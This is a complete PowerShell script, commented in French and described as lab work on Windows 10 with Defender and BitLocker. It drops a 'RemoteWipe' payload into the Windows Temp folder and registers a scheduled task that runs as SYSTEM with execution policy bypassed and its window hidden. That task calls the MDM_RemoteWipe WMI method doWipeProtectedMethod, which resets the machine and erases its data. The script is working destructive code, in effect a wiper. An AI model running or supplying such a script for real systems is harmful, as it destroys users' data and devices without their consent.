#Working on my lab using W10 w/ MDE/MDAV/Bitlocker

$ErrorActionPreference = 'Stop'

try {
    Write-Output "=== Préparation du payload RemoteWipe ==="
    $payloadPath = Join-Path $env:windir "Temp\RemoteWipe_payload.ps1"
    $taskName = "RemoteWipeTask"

    # Contenu du payload (le script WMI RemoteWipe)
    $payload = @'

Write-Output "=== Wipe initialization ==="

$namespaceName = "root\cimv2\mdm\dmmap"
$className     = "MDM_RemoteWipe"
#$methodName    = "doWipeMethod"  
$methodName    = "doWipeProtectedMethod"   


try {
    # Récupère l'instance RemoteWipe
    $instance = Get-CimInstance -Namespace $namespaceName -ClassName $className `
               -Filter "ParentID='./Vendor/MSFT' and InstanceID='RemoteWipe'" -ErrorAction Stop

    if (-not $instance) {
        throw "Instance MDM_RemoteWipe introuvable. Vérifie WinRE et compatibilité OS."
    }

    # Paramètre "vide" requis
    $params = New-Object Microsoft.Management.Infrastructure.CimMethodParametersCollection
    $param  = [Microsoft.Management.Infrastructure.CimMethodParameter]::Create("param", "", "String", "In")
    $params.Add($param) | Out-Null

    Write-Output "Lancement du wipe (méthode: $methodName) ..."
    $session = New-CimSession -ErrorAction Stop
    $result  = $session.InvokeMethod($namespaceName, $instance, $methodName, $params)

    Write-Output ("Résultat.ReturnValue = {0}" -f $result.ReturnValue)
    if ($result.ReturnValue -eq 0) {
        Write-Output "Wipe déclenché avec succès."
        exit 0
    } else {
        Write-Output ("Wipe retourné code: {0}" -f $result.ReturnValue)
        exit 1
    }
}
catch {
    Write-Error "Erreur pendant le wipe : $_"
    exit 2
}
'@

    # Écrire le payload sur disque (remplace si existant)
    Write-Output "Écriture du payload dans : $payloadPath"
    $payload | Set-Content -Path $payloadPath -Encoding UTF8 -Force

    # Vérifier que le fichier existe et est lisible
    if (-not (Test-Path $payloadPath)) {
        throw "Échec de la création du payload ($payloadPath)."
    }

    Write-Output "Payload créé. Taille: $(Get-Item $payloadPath).Length bytes"

    # Si la tâche existe déjà, la supprimer pour remplacer (idempotence)
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Write-Output "La tâche '$taskName' existe déjà. Suppression..."
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    $arg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg

    # Déclencheur : une exécution unique dans 1 minute (ajuster si besoin)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)

    # Principal SYSTEM (ServiceAccount) avec privilèges les plus élevés
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Write-Output "Enregistrement de la tâche planifiée '$taskName' (exécution en tant que SYSTEM)..."
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Tâche pour exécuter RemoteWipe via WMI Bridge" -Force

    Write-Output "Tâche enregistrée. Démarrage immédiat de la tâche..."
    Start-ScheduledTask -TaskName $taskName

    Write-Output "Tâche démarrée. Vérifie l'état avec Get-ScheduledTask -TaskName '$taskName' et Get-EventLog/System pour les sorties."
}
catch {
    Write-Error "Erreur lors de la préparation / enregistrement de la tâche : $_"
    throw
}
